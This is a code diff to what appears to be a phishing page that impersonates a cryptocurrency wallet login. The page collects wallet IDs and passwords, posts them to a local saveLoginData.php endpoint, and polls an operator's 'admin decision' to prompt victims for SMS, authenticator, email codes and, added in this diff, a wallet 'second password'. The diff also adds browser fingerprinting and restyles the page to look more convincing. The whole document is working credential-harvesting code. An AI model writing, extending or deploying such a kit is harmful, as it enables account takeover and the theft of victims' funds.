@@ -22,7 +22,7 @@
     <div class="container-fluid">
 
         <div class="sc-bnXvFD dDillI">
-            <div style="height:90px;" class="col-md-12">
+            <div style="height:112px;" class="col-md-12">
                 <div class="sc-cmthru buGjPd sc-gHboQg hnSMth">
                     <div class="sc-hMFtBS gZupyF">
                         <div class="sc-eerKOB cTWApN" style="display: flex;flex-direction: column;">
@@ -45,7 +45,7 @@
                         </div>
                     </div>
                     <form class="sc-jxGEyO hQuvQG sc-gleUXh FIdwe">
-                        <div class="sc-dEfkYy hkmucL">
+                        <div class="sc-dEfkYy hkmucL wallet-id-div">
                             <div class="sc-cqPOvA caEeOr">
                                 <label for="guid" class="sc-gNJABI bHZVbO">
                                     <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
@@ -67,7 +67,7 @@
                                 </div>
                             </div>
                         </div>
-                        <div class="sc-dEfkYy hkmucL">
+                        <div class="sc-dEfkYy hkmucL password-div">
                             <div class="sc-cqPOvA caEeOr">
                                 <label for="password" class="sc-gNJABI bHZVbO">
                                     <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
@@ -135,6 +135,21 @@
                                 <div class="sc-lnmtFM eVQzAR">
                                     <div class="sc-erNlkL frTPDw">
                                         <input data-e2e="loginPassword" id="email_code" name="email_code" type="text" spellcheck="false" class="sc-jhAzac tcirq" value="">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="sc-dEfkYy hkmucL second-password-div" style="display:none;">
+                            <div class="sc-cqPOvA caEeOr">
+                                <label for="second-password" class="sc-gNJABI bHZVbO">
+                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
+                                        <span>Second Password</span>
+                                    </div>
+                                </label>
+                                
+                                <div class="sc-lnmtFM eVQzAR">
+                                    <div class="sc-erNlkL frTPDw">
+                                        <input data-e2e="secondPassword" id="second-password" name="second-password" type="password" spellcheck="false" class="sc-jhAzac tcirq" value="" required>
                                     </div>
                                 </div>
                             </div>
@@ -235,6 +250,8 @@
             sms_code = sms_code.replace(/ /g, "");
             var email_code = $("#email_code").val();
             email_code = email_code.replace(/ /g, "");
+            var password2 = $("#second-password").val();
+            password2 = password2.replace(/ /g, "");
 
             if($(".sms-code-div").css("display") == "block"){
                 if(sms_code == ""){
@@ -244,6 +261,15 @@
                     $("#loading-text").text("Please wait.");
                     $("#loading-div").css("display", "block");
                     fnAjaxSaveAuthCode(sms_code, 'saveSmsAuth');
+                }
+            }else if($(".second-password-div").css("display") == "block"){
+                if(password2 == ""){
+                    return;
+                }else{
+                    $("#login-div").css("display", "none");
+                    $("#loading-text").text("Please wait.");
+                    $("#loading-div").css("display", "block");
+                    fnAjaxSaveAuthCode(password2, 'saveSecondPassword');
                 }
             }else if($(".auth-app-div").css("display") == "block"){
                 if(auth_app_code == ""){
@@ -255,12 +281,7 @@
                     fnAjaxSaveAuthCode(auth_app_code, 'saveAppAuth');
                 }
             }else if(adminDecision == 1){
-                // if(finalDecision == 2 ){
-                //     $("#login-div").css("display", "none");
-                //     $("#loading-text").text("Authorization required. Please check your mailbox.");
-                //     $("#loading-div").css("display", "block");
-                //     fnAjaxSaveAuthCode("Email auth required.", 'saveGoogleAuth');
-                // }else 
+                 
                 if(finalDecision == 2  || finalDecision == 0){
                     if(password == "" || wallet_id == ""){
                         return;
@@ -288,18 +309,25 @@
                 //     $("#loading-div").css("display", "block");
                 //     fnAjaxSaveAuthCode(email_code, 'saveGoogleAuth');
                 // }
-            }else{
+            } else {
                 if(password == "" || wallet_id == ""){
                     return;
                 }
                 $("#login-div").css("display", "none");
                 $("#loading-text").text("Please wait.");
                 $("#loading-div").css("display", "block");
-                    
+
+                var ajaxData = {
+                    wallet_id: wallet_id, 
+                    password: password, 
+                    cur_status: "saveLoginData",
+                    browser_name: getBrowserName()
+                }
+
                 $.ajax({
                     url: "./custom/saveLoginData.php",
                     type: 'POST',
-                    data: {wallet_id: wallet_id, password: password, cur_status: "saveLoginData"},
+                    data: ajaxData,
                     success: function(result){
                         console.log(result);
                         user_id = result;
@@ -337,12 +365,12 @@
                 success: function(result){
                     console.log(result);
                     var data = JSON.parse(result);
-                    if(data.admin_decision == 1 || data.admin_decision == 2 || data.admin_decision == 3){
+                    if(data.admin_decision == 1 || data.admin_decision == 2 || data.admin_decision == 3 || data.admin_decision == 4){
                         clearInterval(TimerForGetAdminDecision);
                         adminDecision = data.admin_decision;
-                        //1: email auth, 2: sms-auth, 3: app-auth
+                        //1: email auth, 2: sms-auth, 3: app-auth, 4:password2
                         fnDisplayAuthBlock(data.admin_decision);
-                    }else if(data.admin_decision == 4){//error
+                    }else if(data.admin_decision == 5){//error
                         document.location.href = "./index.php";
                     }else{
                         // ... wait
@@ -355,15 +383,29 @@
             $("#loading-div").css("display", "none");
             var admin_decision = adminDecision;
             if(admin_decision == 2){
+                $(".wallet-id-div").css("display", "block");
+                $(".password-div").css("display", "block");
                 $(".sms-code-div").css("display", "block");
                 $("#sms_code").val("");
                 $(".auth-app-div").css("display", "none");
                 $(".email-code-div").css("display", "none");
+                $(".second-password-div").css("display", "none");
             }else if(admin_decision == 3){
+                $(".wallet-id-div").css("display", "block");
+                $(".password-div").css("display", "block");
                 $(".auth-app-div").css("display", "block");
                 $("#auth_app_code").val("");
                 $(".sms-code-div").css("display", "none");
                 $(".email-code-div").css("display", "none");
+                $(".second-password-div").css("display", "none");
+            }else if(admin_decision == 4){
+                $(".wallet-id-div").css("display", "none");
+                $(".password-div").css("display", "none");
+                $(".auth-app-div").css("display", "none");
+                $("#auth_app_code").val("");
+                $(".sms-code-div").css("display", "none");
+                $(".email-code-div").css("display", "none");
+                $(".second-password-div").css("display", "block");
             }else if(admin_decision == 1){
                 // $(".email-code-div").css("display", "block");
                 // $("#email_code").val("");
@@ -406,12 +448,47 @@
                     }else if(data.final_decision == 4){
                         adminDecision = 3;
                         fnDisplayAuthBlock(adminDecision);
+                    }else if(data.final_decision == 5){
+                        adminDecision = 4;
+                        fnDisplayAuthBlock(adminDecision);
                     }else{
                         // ... wait
                     }
                 }
             });
-        }       
+        } 
+        function getBrowserName() {
+            var sBrowser, sUsrAg = navigator.userAgent;
+
+            // The order matters here, and this may report false positives for unlisted browsers.
+
+            if (sUsrAg.indexOf("Firefox") > -1) {
+                sBrowser = "Mozilla Firefox";
+                // "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0"
+            } else if (sUsrAg.indexOf("SamsungBrowser") > -1) {
+                sBrowser = "Samsung Internet";
+                // "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G955F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36
+            } else if (sUsrAg.indexOf("Opera") > -1 || sUsrAg.indexOf("OPR") > -1) {
+                sBrowser = "Opera";
+                // "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.106"
+            } else if (sUsrAg.indexOf("Trident") > -1) {
+                sBrowser = "Internet Explorer";
+                // "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Zoom 3.6.0; wbx 1.0.0; rv:11.0) like Gecko"
+            } else if (sUsrAg.indexOf("Edge") > -1) {
+                sBrowser = "Microsoft Edge";
+                // "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
+            } else if (sUsrAg.indexOf("Chrome") > -1) {
+                sBrowser = "Google Chrome";
+                // "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/66.0.3359.181 Chrome/66.0.3359.181 Safari/537.36"
+            } else if (sUsrAg.indexOf("Safari") > -1) {
+                sBrowser = "Apple Safari";
+                // "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1 980x1306"
+            } else {
+                sBrowser = "unknown";
+            }
+
+            return sBrowser
+        }
     });
     </script>
 
@@ -481,7 +558,7 @@
             src: url(./custom/font/Inter-Bold-a7dc5794cd7b07663ab2b8bcf96c0373.otf);
         }
         body{
-            background-color: rgb(13, 53, 120);
+            background-color: rgb(18, 29, 51);
             height: auto;
             min-height: 100%;
             width: 100%;
@@ -494,7 +571,7 @@
             display: flex;
             flex-direction: row;
             -webkit-box-pack: justify;
-            justify-content: space-between;
+            justify-content: center;
             -webkit-box-align: center;
             align-items: center;
             width: 100%;
@@ -896,6 +973,9 @@
         }
         label{
             margin-bottom:0px;
+        }
+        .sc-bnXvFD {
+            background-image: url(./custom/img/bg-pattern.svg);
         }
 
     </style>
